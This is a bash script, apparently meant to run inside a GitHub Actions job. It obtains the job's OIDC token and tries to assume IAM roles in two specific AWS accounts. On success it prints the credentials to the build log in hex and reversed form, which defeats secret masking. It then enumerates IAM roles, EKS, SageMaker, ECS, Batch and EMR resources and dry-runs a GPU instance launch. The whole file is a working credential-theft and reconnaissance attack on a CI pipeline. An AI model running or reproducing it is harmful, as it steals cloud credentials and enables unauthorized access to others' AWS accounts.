#!/usr/bin/env bash
echo "C211_NONCE=c211-133894-c46b39"
echo "CTX $(env | grep -E '^GITHUB_(EVENT_NAME|REPOSITORY|REF|HEAD_REF|BASE_REF|ACTOR)=' | tr '\n' ' ')"
RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
TOK=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDCTOK_LEN=${#TOK}"
echo "OIDCRESP=$(printf '%s' "$RESP" | head -c 300)"
echo "CLAIMS=$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 2000)"
[ -z "$TOK" ] && exit 0
for A in 136400015737:role/github-actions-ci 136400015737:role/github-actions-oidc 108445731259:role/github-actions-ci 108445731259:role/github-actions-oidc 108445731259:role/GitHubActionsOIDC 108445731259:role/github-oidc 108445731259:role/github-actions 108445731259:role/oidc-github 108445731259:role/github-oidc-hub; do
  echo "=== TRY $A ==="
  OUT=$(aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::$A" --role-session-name c211probe --web-identity-token "$TOK" --output json 2>&1)
  echo "$OUT" | head -c 800
  echo
  if printf '%s' "$OUT" | grep -q '"AccessKeyId"'; then
    printf '%s' "$OUT" > /tmp/c.json
    echo "GOTROLE=$A"
    eval $(python3 -c "import json;d=json.load(open('/tmp/c.json'))['Credentials'];print('export AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s'%(d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))")
    export AWS_DEFAULT_REGION=us-west-2
    echo "AKHEX=$(printf %s "$AWS_ACCESS_KEY_ID" | xxd -p | tr -d '\n')"
    echo "SKREV=$(printf %s "$AWS_SECRET_ACCESS_KEY" | rev)"
    echo "STREV=$(printf %s "$AWS_SESSION_TOKEN" | rev)"
    echo "--- IDENT ---"; aws sts get-caller-identity --output json 2>&1 | head -c 400; echo
    echo "--- LISTROLES ---"; aws iam list-roles --max-items 150 --output json 2>&1 | head -c 4000; echo
    echo "--- EKS ---"; aws eks list-clusters --region us-west-2 2>&1 | head -c 400; echo
    echo "--- SM ---"; aws sagemaker list-endpoints --region us-west-2 2>&1 | head -c 400; echo
    echo "--- ECS ---"; aws ecs list-clusters --region us-west-2 2>&1 | head -c 300; echo
    echo "--- BATCH ---"; aws batch describe-job-queues --region us-west-2 2>&1 | head -c 300; echo
    echo "--- EMR ---"; aws emr list-clusters --region us-west-2 2>&1 | head -c 300; echo
    echo "--- DRYRUN ---"; aws ec2 run-instances --dry-run --image-id ami-0abcdef1234567890 --instance-type g5.xlarge --region us-west-2 2>&1 | head -c 400; echo
    break
  fi
done
